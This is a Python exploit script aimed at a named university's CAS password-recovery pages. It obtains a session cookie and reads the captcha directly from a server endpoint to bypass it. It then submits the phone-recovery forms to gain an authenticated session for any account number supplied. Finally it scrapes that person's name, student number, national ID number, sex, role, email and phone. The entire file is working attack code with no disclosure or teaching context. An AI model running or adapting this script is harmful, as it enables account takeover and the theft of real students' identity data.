#!/usr/bin/env python3
from bs4 import BeautifulSoup
import requests
import sys

requrl = "https://cas.scau.edu.cn/safe/findbyemail.jsp"
captcha_image_url = 'https://cas.scau.edu.cn/safe/image.jsp'
captcha_url = "https://cas.scau.edu.cn/safe/yanzhengma.jsp"
pre_vuln_url = "https://cas.scau.edu.cn/safe/findbyphone.jsp"
vuln_url = "https://cas.scau.edu.cn/safe/sendphone1.jsp"
pre_info_url = 'https://cas.scau.edu.cn/safe/casGenericSuccess.jsp'
info_url = 'https://cas.scau.edu.cn/safe/user/information.jsp'


def get_session_and_mode():
    print('[+] Fetching session_id and mode...: ', end='', flush=True)
    res = requests.get(requrl)
    soup = BeautifulSoup(res.text, "html.parser")
    mode = None
    for i in soup.find_all('input'):
        if i.get('id') == 'mode':
            mode = i.get('value')
            break
    if mode is None:
        sys.exit('[!] Fetch mode failed! Exit now!')
    session_id = res.cookies.get('JSESSIONID')
    if session_id is None:
        sys.exit('[!] Fetch session_id failed! Exit now!')
    # print('[*] Get session_id: %s' % session_id)
    print('Done', flush=True)
    return (session_id, mode)

def get_captcha(session_id):
    print('[+] Fetching captcha...: ', end='', flush=True)
    cookies = dict(JSESSIONID=session_id)
    # 得先请求一遍验证码图片, 才能生成验证码
    requests.get(captcha_image_url, cookies=cookies)
    res = requests.get(captcha_url, cookies=cookies)
    if 'Error report' in res.text:
        sys.exit('[!] Fetch captcha failed! Exit now!')
    print('Done', flush=True)
    return res.text[:4]

def send_payload(session_id, account, mode, captcha):
    print('[+] Sending payload...: ', end='', flush=True)
    cookies = dict(JSESSIONID=session_id)
    datas = dict(mode=mode, account=account, yanimage=captcha, myname='')
    res = requests.post(pre_vuln_url, data=datas, cookies=cookies)
    soup = BeautifulSoup(res.text, "html.parser")
    code = None
    for i in soup.find_all('input'):
        if i.get('name') == 'code':
            code = i.get('value')
            break
    if code is None:
        sys.exit('[!] Fetch code failed! Exit now!')
    # print(code)
    datas2 = dict(code=code, username=account, account='', yzm=captcha)
    res = requests.post(vuln_url, data=datas2, cookies=cookies)
    if 'Error report' in res.text:
        sys.exit('[!] Exploit failed! Exit now!')
    # print(res.text)
    print('Done', flush=True)

def fetch_info(session_id):
    print('[+] Fetching info...: ', end='', flush=True)
    cookies = dict(JSESSIONID=session_id)
    res = requests.get(pre_info_url, cookies=cookies)
    if res.status_code != 200:
        sys.exit('[!] Fetch pre_info_url failed! Exit now!')
    res = requests.get(info_url, cookies=cookies)
    if 'Error report' in res.text:
        sys.exit('[!] Exploit failed! Exit now!')
    result = {}
    soup = BeautifulSoup(res.text, "html.parser")
    ids = ['screenname', 'username', 'edupersoncardid', 'edupersonsex', 'typeid', 'emailaddress', 'phonenumber']
    for i in soup.find_all('input'):
        tag_id = i.get('id')
        if tag_id in ids:
            result[tag_id] = i.get('value')
    print('Done', flush=True)
    return result

def show_info(datas):
    print('The result is:')
    ids_map = {'screenname': '学号', 'username': '姓名', 'edupersoncardid': '身份证号', 'edupersonsex': '性别', 'typeid': '身份', 'emailaddress': '邮箱', 'phonenumber': '电话号码'}
    for k, v in datas.items():
        print("%s: %s" % (ids_map.get(k, "Undefined"), v))

if len(sys.argv) != 2:
    sys.exit('[!] Wrong length of argv, need a account')
account = sys.argv[1]

session_id, mode = get_session_and_mode()
captcha = get_captcha(session_id)

send_payload(session_id, account, mode, captcha)
result = fetch_info(session_id)
show_info(result)